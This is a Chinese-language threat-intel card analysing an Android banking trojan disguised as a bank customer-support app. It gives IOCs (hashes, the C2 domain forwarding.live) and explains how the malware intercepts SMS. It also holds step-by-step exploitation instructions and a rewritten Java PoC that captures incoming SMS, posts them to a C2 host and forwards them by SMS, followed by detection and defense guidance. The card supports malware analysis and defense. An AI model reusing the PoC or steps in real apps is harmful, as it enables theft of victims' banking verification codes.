---
id: mobile-android-sms-received-forward-c2-number-banking-trojan
title: Android 银行木马短信拦截双通道外传：SMS_RECEIVED 广播解析 PDU，C2 下发转发号码用 SmsManager 转发并 JSON POST 回传
type: scenario
domain: mobile
path: mobile/android
technique: android-sms-received-broadcast-forward-c2-number-json-exfil
aliases:
- Customer Support 银行木马
- mywork 家族短信窃取
- SMS_RECEIVED 广播拦截
- SmsMessage.createFromPdu
- C2 下发短信转发号码
- SmsManager.sendTextMessage 转发
- forwarding.live C2
- 短信双通道外传
tags:
- android
- malware
- banker
- sms-interception
- broadcast-receiver
- exfiltration
- smsmanager
- c2
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V424
  verified_at: '2026-11-09T17:28:46+08:00'
  notes: 已对照原文全文与11张图核对：包名 com.bank.customersupport、应用名 Customer Support、MD5 ad4f0044d5d9194e6cf46601adb8802b、证书 MD5 0e40ef31babffc4fd9b2b142c0e198a3、TAG mywork、VT Banker 标签与图1/2/3 一致；SmsReceiver 监听 SMS_RECEIVED、SmsMessage.createFromPdu、previous_message 去重、Helper.sendSMS(\"/site/number?site=customer-support10\") 后经 onPostExecute 取 JSON data 号码并 SmsManager.sendTextMessage 转发、Helper.sendData(\"/sms-reader/add\") 以 {site,message,sender} JSON POST 到 API_URL=https://forwarding.live/api 均与图4/5/6/7/8 一致。已修正卡内“即使 C2 不可达也能短信转发/两条路互不依赖”的过度表述：转发号码同样由 C2 /site/number 下发，C2 不可达时两通道均失效（staging 与 knowledge 同步）。未验证点：Helper.sendSMS/getJson 实现与 Manifest 未展示，PoC 为按截图重写（receiver priority 999 为示意）；样本未运行。dedup 候选（AhMyth、云盘窃密、remote-assistance 等）均不同链；dup-scan.json(11-08) 早于建卡(11-09) 无本卡 pair；无 sources/source_url、无文章 ID/原文 URL/长段摘录（保留样本 C2 域名作为 IOC），path mobile/android 合法；非组件类无受影响版本。颗粒度：单一短信双通道外传原子，与溯源卡按行为/方法拆分。
---

## 一句话结论

伪装成银行客服（`Customer Support`，包名 `com.bank.customersupport`）的 Android 银行木马注册 `android.provider.Telephony.SMS_RECEIVED` 广播接收器，用 `SmsMessage.createFromPdu` 解析每条短信的发送者与正文，先按 `previous_message` 去重，然后同时做两件事：① 把 `{site, message, sender}` 以 JSON POST 到 C2 的 `/sms-reader/add`；② 请求 C2 的 `/site/number?site=<站点标识>` 取回一个“转发号码”，再用 `SmsManager.sendTextMessage` 把短信正文以短信形式转发过去——实现“线上回传 + 短信转发”双通道；短信通道的转发号码同样由 C2 的 `/site/number` 接口下发，并非脱离 C2 的独立备份通道。

## 原理

- **短信广播拦截**：Android 的 `SMS_RECEIVED` 是受保护广播，应用申请 `RECEIVE_SMS` 权限后可在 `BroadcastReceiver.onReceive` 中收到 `pdus` 数组；样本用 `SmsMessage.createFromPdu((byte[]) pdu)` 还原短信对象，读取 `getDisplayOriginatingAddress()`（发送号码）与 `getMessageBody()`（正文）。银行木马借此实时获取短信验证码、转账通知与客服验证码。
- **去重**：样本用成员变量 `previous_message` 记录上一条正文，相同正文直接跳过并打日志，避免系统重复投递或同一 PDU 多段拆分导致重复转发。
- **C2 HTTP 回传**：`Helper.sendData("/sms-reader/add", jsonData)` 在 `AsyncTask.doInBackground` 中拼接 `API_URL + path`，用 `HttpURLConnection` POST `application/json`，body 为 `{"site":"<站点标识>","message":"<正文>","sender":"<发送号码>"}`，读取 200 响应与返回体。硬编码的 `API_URL` 为 `https://forwarding.live/api` 一类域名，`site` 用于区分同族不同品牌样本（本例 `customer-support10`）。
- **C2 下发转发号码**：另一条路径请求 `/site/number?site=<站点标识>`，从 JSON 响应的 `data` 字段取出电话号码，再 `SmsManager.getDefault().sendTextMessage(phoneNumber, null, messageBody, null, null)` 把拦截到的短信原文发给该号码。号码由服务端动态下发，换号不需要更新样本，也便于按样本/受害群体分流。
- **为什么是双通道**：HTTP 通道便于批量存储与后台检索；短信通道在设备仍能发短信时可直接把验证码送到攻击者（或“客服”接码号）手上，不必等攻击者实时登录后台查看。两条通道共用同一 C2 域名与 `site` 标识，短信通道需要先请求 `/site/number` 取号，因此 C2 不可达时两条通道都会失效，但双通道仍提升了数据到达与利用效率。
- **家族特征**：日志 TAG 使用 `mywork`，与 VirusTotal 上 BankerAgent/Spy.Banker 等标签一并作为同源样本聚类线索；应用图标与名称伪装成“银行客服”，包名也仿银行客服业务。

## 触发条件

- 用户安装并首次运行 APK，授予 `RECEIVE_SMS`（部分实现还需 `READ_SMS`）与联网权限；Android 6+ 需用户同意危险权限弹窗。
- 设备能接收短信且未被安全软件拦截广播/权限；C2 域名可达（HTTP 通道），或设备具有短信发送能力与余额（短信通道）。
- 应用进程存活；部分机型需关闭电池优化/自启动限制才能长期收到广播。
- 样本未加壳或可脱壳，便于静态还原 C2 与站点标识（分析侧）。

## 利用步骤

1. Manifest 注册 `SmsReceiver` 并申请 `RECEIVE_SMS`/`INTERNET`（需要 `READ_SMS` 的实现另行申请）；诱导用户授予权限。
2. `onReceive` 判断 action 为 `SMS_RECEIVED`，遍历 `intent.getExtras().get("pdus")`，`SmsMessage.createFromPdu` 解析发送者与正文。
3. 用 `previous_message` 去重后，构造 JSON `{site, message, sender}`，调用 `Helper.sendData("/sms-reader/add", json)` POST 到 C2。
4. 另发请求到 `/site/number?site=<站点标识>`，解析返回 JSON 的 `data` 字段作为转发号码；`SmsManager.sendTextMessage(number, null, messageBody, null, null)` 转发原文。
5. 后台按 `site` 与发送者分类存储，用于验证码/银行通知的实时利用。

## PoC

按原文代码结构重写的最小示意（权限、C2、站点为占位符，未执行）：

```java
public class SmsReceiver extends BroadcastReceiver {
    private String previous_message = "";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() == null ||
            !intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) return;
        Bundle bundle = intent.getExtras();
        for (Object pdu : (Object[]) bundle.get("pdus")) {
            SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
            String sender = sms.getDisplayOriginatingAddress();
            String body   = sms.getMessageBody();
            if (body.equals(this.previous_message)) continue;   // 去重
            this.previous_message = body;

            // 通道 1：JSON POST 到 C2
            JSONObject json = new JSONObject();
            json.put("site", "customer-support10");
            json.put("message", body);
            json.put("sender", sender);
            postJson("https://<c2>/api/sms-reader/add", json);

            // 通道 2：向 C2 索取转发号码后用短信转发
            String number = getJson("https://<c2>/api/site/number?site=customer-support10")
                                .getString("data");
            SmsManager.getDefault().sendTextMessage(number, null, body, null, null);
        }
    }
}
```

```xml
<!-- Manifest 关键项 -->
<uses-permission android:name="android.permission.RECEIVE_SMS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.INTERNET"/>
<receiver android:name=".SmsReceiver">
  <intent-filter android:priority="999">
    <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
  </intent-filter>
</receiver>
```

说明：原文展示的是 `SmsReceiver`、`onPostExecute`（解析 `data` 后 `sendTextMessage`）与 `Helper.sendData`（HttpURLConnection JSON POST）的代码截图；`Helper.sendSMS` 与 `getJson` 的实现未完整展示，PoC 按可见逻辑重写，未运行。

## 变体与关联

- [[mobile-android-spyware-clouddisk-contact-sms-photo-exfil]]：通过 `ContentResolver` 批量读取存量短信并上传，本卡是实时监听新短信 + C2 下发号码的短信转发，触发点与通道不同。
- [[mobile-android-ahmyth-rat-static-command-map]]：RAT 类短信/设备信息外链的静态剖析方法可参考。
- [[mobile-android-spynote-fake-police-accessibility-credential-theft]]：同为仿冒客服/公安诱导安装的 Android 恶意软件，但其窃取面在无障碍服务与锁屏凭据。
- 变体：通道可换成 Telegram Bot、MQTT、WebSocket、云函数；转发方式可换成邮件、USSD、静默短信；可加 `NotificationListenerService` 读取通知中的验证码；可加无障碍服务自动点击授予权限。
- 边界：用户拒绝 `RECEIVE_SMS`、系统默认短信应用变更/权限收紧（Android 4.4+ 仅默认短信应用可写短信数据库，但 `SMS_RECEIVED` 广播仍可被申请权限的应用接收）、C2 下线且短信通道号码失效、短信费用不足时失效。

## 检测与防御

- 检测：应用申请 `RECEIVE_SMS`+`SEND_SMS`+`INTERNET` 组合却无短信/通讯类业务功能；Manifest 中 `SMS_RECEIVED` receiver 的 priority 异常高；代码同时出现 `SmsMessage.createFromPdu`、`HttpURLConnection` POST 与 `SmsManager.sendTextMessage`。
- 检测：设备在收到短信后立即产生到 C2 的 HTTPS POST，随后向陌生号码发送短信；同一进程先请求 `/site/number` 再调用发送短信 API。
- 防御：只授予可信应用短信权限；Android 企业设备限制侧载与短信权限；运营商/终端对“短信内容被读取后立即外发”的行为告警；应用商店对权限组合与行为链扫描。
- 响应：隔离样本、记录包名与证书/哈希、提取 `site` 标识与 C2、核查该设备近期外发短信与转发号码、通知运营商与受害者；不要在未授权设备运行样本。
